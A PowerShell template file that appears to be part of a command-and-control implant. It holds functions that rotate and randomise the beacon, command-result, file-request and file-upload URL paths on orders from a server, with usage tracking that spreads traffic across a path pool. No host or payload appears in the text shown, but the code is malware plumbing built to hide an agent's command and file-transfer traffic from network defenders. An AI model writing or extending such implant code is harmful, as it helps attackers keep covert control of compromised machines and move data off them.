# Path rotation configuration
$global:pathRotationEnabled = $true
$global:currentRotationId = {{ROTATION_ID}}
$global:nextRotationTime = {{NEXT_ROTATION_TIME}}
$global:rotationInterval = {{ROTATION_INTERVAL}}

# Store initial paths
$global:initialPaths = @{
    "beacon_path" = "{{BEACON_PATH}}";
    "cmd_result_path" = "{{CMD_RESULT_PATH}}";
    "file_request_path" = "{{FILE_REQUEST_PATH}}";
    "file_upload_path" = "{{FILE_UPLOAD_PATH}}";
}

# Store path pool for modular operation
$global:pathPool = @()

# Store current paths
$global:currentPaths = $global:initialPaths.Clone()

# Track which paths have been used and how many times
$global:pathUsageTracking = @{}

# Function to handle path rotation updates from server
function Update-PathRotation {
    param(
        [int]$RotationId,
        [int]$NextRotationTime,
        [hashtable]$Paths
    )
    
    $global:currentRotationId = $RotationId
    $global:nextRotationTime = $NextRotationTime
    
    # Update paths if provided
    if ($Paths -and $Paths.Count -gt 0) {
        $global:currentPaths = @{}
        $global:pathPool = @()
        $global:pathUsageTracking = @{} # Reset usage tracking on rotation
        
        foreach ($key in $Paths.Keys) {
            if ($key -eq "beacon_path" -or $key -eq "cmd_result_path" -or $key -eq "file_request_path" -or $key -eq "file_upload_path") {
                $global:currentPaths[$key] = $Paths[$key]
                Write-Host "Updated path $key to: $($Paths[$key])"
            }
            elseif ($key -eq "path_pool") {
                # Store the path pool for random selection
                if ($Paths[$key] -is [array]) {
                    $global:pathPool = $Paths[$key]
                    Write-Host "Updated path pool with $($global:pathPool.Count) paths"
                    
                    # Initialize usage tracking for each path
                    foreach ($path in $global:pathPool) {
                        $global:pathUsageTracking[$path] = 0
                    }
                }
                else {
                    Write-Host "Warning: path_pool is not an array, skipping"
                }
            }
        }
    }
    
    # Log the rotation
    $nextTime = [DateTimeOffset]::FromUnixTimeSeconds($NextRotationTime).DateTime.ToString('yyyy-MM-dd HH:mm:ss')
    Write-Host "Path rotation updated: ID $RotationId, next rotation at $nextTime"
}

# Function to get a random path from the pool with improved selection logic
function Get-RandomPath {
    [CmdletBinding()]
    param(
        [switch]$ForceRandom = $false,
        [switch]$PreferUnused = $true
    )
    
    # Check if we have a path pool to use
    if (-not $global:pathPool -or $global:pathPool.Count -eq 0) {
        # If no path pool available, return beacon path as fallback
        Write-Verbose "No path pool available, using beacon_path as fallback"
        return Get-CurrentPath -PathType "beacon_path"
    }
    
    # If we need completely random selection, bypass usage tracking
    if ($ForceRandom) {
        $randomIndex = Get-Random -Minimum 0 -Maximum $global:pathPool.Count
        $path = $global:pathPool[$randomIndex]
        Write-Verbose "Forced random path selection: $path"
        
        # Still update usage stats
        if (-not $global:pathUsageTracking.ContainsKey($path)) {
            $global:pathUsageTracking[$path] = 0
        }
        $global:pathUsageTracking[$path]++
        
        return $path
    }
    
    # Prefer least used paths
    if ($PreferUnused) {
        # Find the paths that have been used the least
        $minUsage = [int]::MaxValue
        $leastUsedPaths = @()
        
        # Initialize usage count for any new paths
        foreach ($path in $global:pathPool) {
            if (-not $global:pathUsageTracking.ContainsKey($path)) {
                $global:pathUsageTracking[$path] = 0
            }
            
            # Track min usage count
            if ($global:pathUsageTracking[$path] -lt $minUsage) {
                $minUsage = $global:pathUsageTracking[$path]
                $leastUsedPaths = @($path)
            }
            elseif ($global:pathUsageTracking[$path] -eq $minUsage) {
                $leastUsedPaths += $path
            }
        }
        
        # Pick randomly from the least used paths
        $selectedPath = $leastUsedPaths[$(Get-Random -Minimum 0 -Maximum $leastUsedPaths.Count)]
        $global:pathUsageTracking[$selectedPath]++
        
        Write-Verbose "Selected least used path: $selectedPath (usage count: $($global:pathUsageTracking[$selectedPath]))"
        return $selectedPath
    }
    
    # Default behavior: weighted random selection based on usage counts
    $totalWeight = $global:pathPool.Count
    $weights = @{}
    
    foreach ($path in $global:pathPool) {
        if (-not $global:pathUsageTracking.ContainsKey($path)) {
            $global:pathUsageTracking[$path] = 0
        }
        
        # Inverse weight - less used paths get higher weights
        $weight = $totalWeight - $global:pathUsageTracking[$path]
        if ($weight -lt 1) { $weight = 1 } # Ensure minimum weight of 1
        $weights[$path] = $weight
    }
    
    # Calculate total weight
    $totalWeight = 0
    foreach ($weight in $weights.Values) {
        $totalWeight += $weight
    }
    
    # Select path based on weights
    $randomValue = Get-Random -Minimum 1 -Maximum ($totalWeight + 1)
    $cumulativeWeight = 0
    
    foreach ($path in $weights.Keys) {
        $cumulativeWeight += $weights[$path]
        if ($randomValue -le $cumulativeWeight) {
            # Update usage count for the selected path
            $global:pathUsageTracking[$path]++
            Write-Verbose "Selected weighted path: $path (usage count: $($global:pathUsageTracking[$path]))"
            return $path
        }
    }
    
    # Fallback if something went wrong with weighted selection
    $randomIndex = Get-Random -Minimum 0 -Maximum $global:pathPool.Count
    $path = $global:pathPool[$randomIndex]
    $global:pathUsageTracking[$path]++
    Write-Verbose "Fallback random path selection: $path"
    return $path
}

# Function to get the current path by type
function Get-CurrentPath {
    param([string]$PathType)
    
    # First look in current paths (rotated)
    if ($global:currentPaths.ContainsKey($PathType)) {
        $path = $global:currentPaths[$PathType]
        if (-not [string]::IsNullOrEmpty($path)) {
            Write-Verbose "Using current path for ${PathType}: $path"
            return $path
        }
    }
    
    # Then try initial paths
    if ($global:initialPaths.ContainsKey($PathType)) {
        $path = $global:initialPaths[$PathType]
        if (-not [string]::IsNullOrEmpty($path)) {
            Write-Verbose "Using initial path for ${PathType}: $path"
            return $path
        }
    }
    
    # If we get here, we don't have a valid path - throw error instead of using fallbacks
    $errorMsg = "ERROR: No valid path found for '${PathType}'. Dynamic path rotation requires all paths."
    Write-Host $errorMsg
    throw $errorMsg
}

# Function to check if rotation is needed
function Check-PathRotation {
    $currentTime = [int][double]::Parse((Get-Date -UFormat %s))
    
    # Check if we're past rotation time
    if ($global:pathRotationEnabled -and $currentTime -ge $global:nextRotationTime) {
        # We need to get rotations info from server ASAP
        Write-Host "Rotation time reached, waiting for update from server..."
        return $true
    }
    
    return $false
}